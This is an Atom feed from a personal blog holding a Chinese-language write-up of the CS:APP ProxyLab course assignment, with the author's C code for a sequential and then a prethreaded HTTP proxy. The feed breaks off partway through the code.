<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Yu</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="lengyu.me/"/>
  <updated>2019-07-28T15:41:39.012Z</updated>
  <id>lengyu.me/</id>
  
  <author>
    <name>Leng Yu</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CS:APP ProxyLab</title>
    <link href="lengyu.me/2018/10/31/CS-APP-ProxyLab/"/>
    <id>lengyu.me/2018/10/31/CS-APP-ProxyLab/</id>
    <published>2018-10-31T08:12:56.000Z</published>
    <updated>2019-07-28T15:41:39.012Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ProxyLab"><a href="#ProxyLab" class="headerlink" title="ProxyLab"></a>ProxyLab</h1><p>这一次我们要实现一个自己的代理服务器!</p><h2 id="实验目标"><a href="#实验目标" class="headerlink" title="实验目标"></a>实验目标</h2><p>通过ProxyLab，实践cs:app中学习到的许多概念，比如字节序、I/O、进程控制、异常与信号、内存映射、套接字、并发。</p><h2 id="前置内容"><a href="#前置内容" class="headerlink" title="前置内容"></a>前置内容</h2><p>通过cs:app中有关网络编程的部分我已经实现了一个简单的web服务器，对利用套接字进行开发有了一定的了解，有兴趣可以查看原书第三版中的有关内容以及<a href="https://github.com/FerricIron/YuServer" target="_blank" rel="noopener">YuServer的源代码</a> 。</p><h2 id="材料准备"><a href="#材料准备" class="headerlink" title="材料准备"></a>材料准备</h2><p><a href="http://csapp.cs.cmu.edu/3e/proxylab.pdf" target="_blank" rel="noopener">实验指导书</a></p><p><a href="http://csapp.cs.cmu.edu/3e/proxylab-handout.tar" target="_blank" rel="noopener">实验材料</a></p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="Part-I-Implementing-a-sequential-web-proxy"><a href="#Part-I-Implementing-a-sequential-web-proxy" class="headerlink" title="Part I: Implementing a sequential web proxy"></a>Part I: Implementing a sequential web proxy</h3><h4 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h4><p>实现一个简单的代理服务器，这个服务器只需要转发GET请求即可，并且要求</p><ul><li>不论浏览器如何请求，需要按照HTTP/1.0进行转发</li><li>User-Agent使用proxy.c中给出的部分</li><li>Connection保持为close</li><li>Proxy-Connection保持为close</li><li>代理端口需要用命令行参数给出，不能硬编码</li></ul><h4 id="注意细节"><a href="#注意细节" class="headerlink" title="注意细节"></a>注意细节</h4><ul><li>请求头以\r\n结束，需要特别注意判断结束之后关闭对应的流，否则会卡在某个流的读入。</li><li>注意，需要对URL进行解析得到URI,浏览器没有自动完成这一部分，这和编写服务器的时候是不一样的。</li></ul><h4 id="参考代码"><a href="#参考代码" class="headerlink" title="参考代码"></a>参考代码</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line">---------------------------------proxy.c-----------------------------</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"csapp.h"</span></span></span><br><span class="line"><span class="comment">/* Recommended max cache and object sizes */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_CACHE_SIZE 1049000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_OBJECT_SIZE 102400</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_TYPE_SIZE     4</span></span><br><span class="line"><span class="comment">/* You won't lose style points for including this long line in your code */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *user_agent_hdr = <span class="string">"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3\r\n"</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *user_connection=<span class="string">"Connection: close\r\n"</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *user_proxy_connection=<span class="string">"Proxy-Connection: close\r\n"</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="keyword">char</span> user_agent_hdr[MAXLINE];</span><br><span class="line"><span class="keyword">char</span> user_connection[MAXLINE];</span><br><span class="line"><span class="keyword">char</span> user_proxy_connection[MAXLINE];</span><br><span class="line"><span class="keyword">char</span> user_host[MAXLINE];</span><br><span class="line">&#125;Headers;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">todo</span><span class="params">(<span class="keyword">int</span> fd)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintErrorHeader</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">char</span> status[],<span class="keyword">char</span>* shortMsg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ServerError</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *cause, <span class="keyword">char</span> status[], <span class="keyword">char</span> *shortMsg, <span class="keyword">char</span> *longMsg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ServerPrintResponseHeader</span><span class="params">(<span class="keyword">char</span> *header)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getRequestType</span><span class="params">(<span class="keyword">char</span> *buf)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initHeader</span><span class="params">(Headers* header)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ParseUrl</span><span class="params">(<span class="keyword">char</span> url[],<span class="keyword">char</span> uri[],<span class="keyword">char</span> hostname[],<span class="keyword">char</span> port[],Headers* header)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetRequestHeaders</span><span class="params">(<span class="keyword">rio_t</span> *rio,<span class="keyword">char</span> requestHeaders[],Headers *header)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//printf("%s", user_agent_hdr);</span></span><br><span class="line">    <span class="keyword">int</span> listenfd,connfd;</span><br><span class="line">    <span class="keyword">socklen_t</span> clientlen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">clientaddr</span>;</span></span><br><span class="line">    <span class="keyword">char</span> hostname[MAXLINE],port[MAXLINE];</span><br><span class="line">    <span class="keyword">if</span>(argc!=<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"usage :%s &lt;port&gt; \n"</span>,argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    listenfd=Open_listenfd(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    clientlen=<span class="keyword">sizeof</span>(struct sockaddr_storage);</span><br><span class="line">    connfd=Accept(listenfd,(SA *)&amp;clientaddr,&amp;clientlen);</span><br><span class="line">    Getnameinfo((SA *)&amp;clientaddr,clientlen,hostname,MAXLINE,port,MAXLINE,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">"Accept: (%s,%s)\n"</span>,hostname,port);</span><br><span class="line">    todo(connfd);</span><br><span class="line">    Close(connfd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">todo</span><span class="params">(<span class="keyword">int</span> fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">rio_t</span> rio,rioc;</span><br><span class="line"><span class="keyword">int</span> rc;</span><br><span class="line"><span class="keyword">char</span> buf[MAXLINE],method[MAXLINE],uri[MAXLINE],version[MAXLINE],url[MAXLINE];</span><br><span class="line"><span class="keyword">char</span> hostname[MAXLINE],port[MAXLINE],temp[MAXLINE];</span><br><span class="line">Rio_readinitb(&amp;rio,fd);</span><br><span class="line">Rio_readlineb(&amp;rio,buf,MAXLINE);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>,<span class="string">"Proxy recive header:\n%s\n"</span>,buf);</span><br><span class="line"><span class="built_in">sscanf</span>(buf,<span class="string">"%s %s %s"</span>,method,url,version);</span><br><span class="line"><span class="keyword">if</span>(strcasecmp(method,<span class="string">"GET"</span>))</span><br><span class="line">&#123;</span><br><span class="line">ServerError(fd,method,<span class="string">"501"</span>,<span class="string">"Not implemented"</span>,<span class="string">"ProxyLab not implement this method\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">  Headers header;</span><br><span class="line">  ParseUrl(url,uri,hostname,port,&amp;header);</span><br><span class="line"><span class="built_in">sprintf</span>(buf,<span class="string">"%s %s %s"</span>,method,uri,<span class="string">"HTTP/1.0\r\n"</span>);</span><br><span class="line">GetRequestHeaders(&amp;rio,buf,&amp;header);</span><br><span class="line"><span class="built_in">sscanf</span>(header.user_host,<span class="string">"%s %s"</span>,temp,hostname);</span><br><span class="line"><span class="keyword">char</span> *ptr=<span class="built_in">strchr</span>(hostname,<span class="string">':'</span>);</span><br><span class="line"><span class="keyword">if</span>(ptr!=<span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">strcpy</span>(port,ptr+<span class="number">1</span>);</span><br><span class="line">*ptr=<span class="string">'\0'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">strcpy</span>(port,<span class="string">"80"</span>);</span><br><span class="line">&#125;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>,<span class="string">"Open_clientfd:hostname=%s port=%s\n"</span>,hostname,port);</span><br><span class="line"><span class="keyword">int</span> connfd=Open_clientfd(hostname,port);</span><br><span class="line"><span class="keyword">if</span>(connfd&lt;<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">ServerError(fd,method,<span class="string">"500"</span>,<span class="string">"Can not Connection"</span>,<span class="string">"Proxy Can't connection to end server\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>,<span class="string">"Proxy will send header:\n%s\n"</span>,buf);</span><br><span class="line">Rio_writen(connfd,buf,MAXLINE);</span><br><span class="line">Rio_readinitb(&amp;rioc,connfd);</span><br><span class="line"><span class="keyword">while</span>((rc=Rio_readlineb(&amp;rioc,buf,MAXLINE))&gt;<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>,<span class="string">"Proxy received %d bytes,ten send to end_server\n"</span>,rc);</span><br><span class="line">Rio_writen(fd,buf,rc);</span><br><span class="line">&#125;</span><br><span class="line">  Close(connfd);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getRequestType</span><span class="params">(<span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">char</span> type[MAX_TYPE_SIZE][MAXLINE]=&#123;<span class="string">"Host:"</span>,<span class="string">"User-Agent:"</span>,<span class="string">"Connection:"</span>,<span class="string">"Proxy-Connection:"</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;MAX_TYPE_SIZE;++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(strcasecmp(buf,type[i])==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ParseUrl</span><span class="params">(<span class="keyword">char</span> url[],<span class="keyword">char</span> uri[],<span class="keyword">char</span> hostname[],<span class="keyword">char</span> port[],Headers* header)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *ptr=<span class="built_in">strchr</span>(url,<span class="string">':'</span>);</span><br><span class="line">  <span class="keyword">char</span> *uri_ptr=<span class="built_in">strchr</span>(ptr+<span class="number">3</span>,<span class="string">'/'</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(uri,uri_ptr);</span><br><span class="line">  *uri_ptr=<span class="string">'\0'</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(header-&gt;user_host,ptr+<span class="number">2</span>);</span><br><span class="line">  <span class="keyword">char</span> *port_ptr=<span class="built_in">strchr</span>(ptr+<span class="number">3</span>,<span class="string">':'</span>);</span><br><span class="line">  <span class="keyword">if</span>(port_ptr==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strcpy</span>(port,<span class="string">"80"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="built_in">strcpy</span>(port,port_ptr+<span class="number">1</span>);</span><br><span class="line">      *port_ptr=<span class="string">'\0'</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(hostname,ptr+<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initHeader</span><span class="params">(Headers* header)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">strcpy</span>(header-&gt;user_agent_hdr,user_agent_hdr);</span><br><span class="line"><span class="built_in">strcpy</span>(header-&gt;user_connection,user_connection);</span><br><span class="line"><span class="built_in">strcpy</span>(header-&gt;user_proxy_connection,user_proxy_connection);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetRequestHeaders</span><span class="params">(<span class="keyword">rio_t</span> *rio,<span class="keyword">char</span> requestHeaders[],Headers *header)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[MAXLINE],type[MAXLINE];</span><br><span class="line"><span class="keyword">int</span> rc,tc;</span><br><span class="line">initHeader(header);</span><br><span class="line"><span class="keyword">while</span>((rc=Rio_readlineb(rio,buf,MAXLINE))&gt;<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(buf,<span class="string">"\r\n"</span>)==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sscanf</span>(buf,<span class="string">"%s"</span>,type);</span><br><span class="line">tc=getRequestType(type);</span><br><span class="line"><span class="comment">//fprintf(stdout, "%s",buf );</span></span><br><span class="line"><span class="keyword">switch</span>(tc)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">-1</span>:<span class="built_in">strcat</span>(requestHeaders,buf);<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:<span class="built_in">strcpy</span>(header-&gt;user_host,buf);</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">strcat</span>(requestHeaders,header-&gt;user_agent_hdr);</span><br><span class="line"><span class="built_in">strcat</span>(requestHeaders,header-&gt;user_connection);</span><br><span class="line"><span class="built_in">strcat</span>(requestHeaders,header-&gt;user_proxy_connection);</span><br><span class="line"><span class="built_in">strcat</span>(requestHeaders,header-&gt;user_host);</span><br><span class="line"><span class="built_in">strcat</span>(requestHeaders,<span class="string">"\r\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * help function</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintErrorHeader</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">char</span> status[],<span class="keyword">char</span>* shortMsg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[MAXBUF];</span><br><span class="line">    <span class="comment">/*Send the HTTP response Header to client*/</span></span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">"HTTP/1.0 %s %s\r\n"</span>,status,shortMsg);</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">"%sServer: Yu Web Server\r\n"</span>, buf);</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">"%sConnection: close\r\n\r\n"</span>, buf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*send header to client &amp;&amp; log*/</span></span><br><span class="line">    rio_writen(fd, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    ServerPrintResponseHeader(buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ServerPrintResponseHeader</span><span class="params">(<span class="keyword">char</span> *header)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Response headers:\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, header);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ServerError</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *cause, <span class="keyword">char</span> status[], <span class="keyword">char</span> *shortMsg, <span class="keyword">char</span> *longMsg)</span> </span>&#123;</span><br><span class="line">    PrintErrorHeader(fd,status,shortMsg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Part-II-Dealing-with-multiple-concurrent-requests"><a href="#Part-II-Dealing-with-multiple-concurrent-requests" class="headerlink" title="Part II: Dealing with multiple concurrent requests"></a>Part II: Dealing with multiple concurrent requests</h3><h4 id="实验内容-1"><a href="#实验内容-1" class="headerlink" title="实验内容"></a>实验内容</h4><p>改造前面的代理服务器，使其可以并发处理多个请求。</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>可以采用以下几种方法去解决</p><ul><li>每一个请求开一个进程去处理</li><li>每一个请求开一个线程去处理</li><li>预线程化</li></ul><p>这里我采用的是预线程化的思路，提前准备好多个线程，用信号量去处理线程之间的关系。参考了书p708页的内容，改造非常简单.</p><h4 id="参考代码-1"><a href="#参考代码-1" class="headerlink" title="参考代码"></a>参考代码</h4><p>首先是sbuf包部分</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sbuf_init</span><span class="params">(<span class="keyword">sbuf_t</span> *sp,<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> sp-&gt;buf=<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*n);</span><br><span class="line"> sp-&gt;n=n;</span><br><span class="line"> sp-&gt;front=sp-&gt;rear=<span class="number">0</span>;</span><br><span class="line"> Sem_init(&amp;sp-&gt;mutex,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line"> Sem_init(&amp;sp-&gt;slots,<span class="number">0</span>,n);</span><br><span class="line"> Sem_init(&amp;sp-&gt;items,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sbuf_deinit</span><span class="params">(<span class="keyword">sbuf_t</span> *sp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Free(sp-&gt;buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sbuf_insert</span><span class="params">(<span class="keyword">sbuf_t</span> *sp, <span class="keyword">int</span> item)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">P(&amp;sp-&gt;slots);</span><br><span class="line">P(&amp;sp-&gt;mutex);</span><br><span class="line">sp-&gt;buf[(++sp-&gt;rear)%(sp-&gt;n)]=item;</span><br><span class="line">V(&amp;sp-&gt;mutex);</span><br><span class="line">V(&amp;sp-&gt;items);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sbuf_remove</span><span class="params">(<span class="keyword">sbuf_t</span> *sp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> item;</span><br><span class="line">P(&amp;sp-&gt;items);</span><br><span class="line">P(&amp;sp-&gt;mutex);</span><br><span class="line">item=sp-&gt;buf[(++sp-&gt;front)%(sp-&gt;n)];</span><br><span class="line">V(&amp;sp-&gt;mutex);</span><br><span class="line">V(&amp;sp-&gt;slots);</span><br><span class="line"><span class="keyword">return</span> item;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主线程部分</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//printf("%s", user_agent_hdr);</span></span><br><span class="line">    <span class="keyword">int</span> listenfd,connfd;</span><br><span class="line">    <span class="keyword">socklen_t</span> clientlen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">clientaddr</span>;</span></span><br><span class="line">    <span class="keyword">char</span> hostname[MAXLINE],port[MAXLINE];</span><br><span class="line">    <span class="keyword">pthread_t</span> tid;</span><br><span class="line">    <span class="keyword">if</span>(argc!=<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"usage :%s &lt;port&gt; \n"</span>,argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    listenfd=Open_listenfd(argv[<span class="number">1</span>]);</span><br><span class="line">    sbuf_init(&amp;sbuf,MAX_THREAD_SIZE);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;MAX_THREAD_SIZE;++i)</span><br><span class="line">    &#123;</span><br><span class="line">    Pthread_create(&amp;tid,<span class="literal">NULL</span>,todo,<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    clientlen=<span class="keyword">sizeof</span>(struct sockaddr_storage);</span><br><span class="line">    connfd=Accept(listenfd,(SA *)&amp;clientaddr,&amp;clientlen);</span><br><span class="line">    Getnameinfo((SA *)&amp;clientaddr,clientlen,hostname,MAXLINE,port,MAXLINE,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">"Accept: (%s,%s)\n"</span>,hostname,port);</span><br><span class="line">    <span class="comment">//todo(connfd);</span></span><br><span class="line">    <span class="comment">//Close(connfd);</span></span><br><span class="line">    sbuf_insert(&amp;sbuf,connfd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而todou函数只需要稍作改造使用sbuf_remove去获得对应的文件描述符即可</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Pthread_detach(pthread_self());</span><br><span class="line"><span 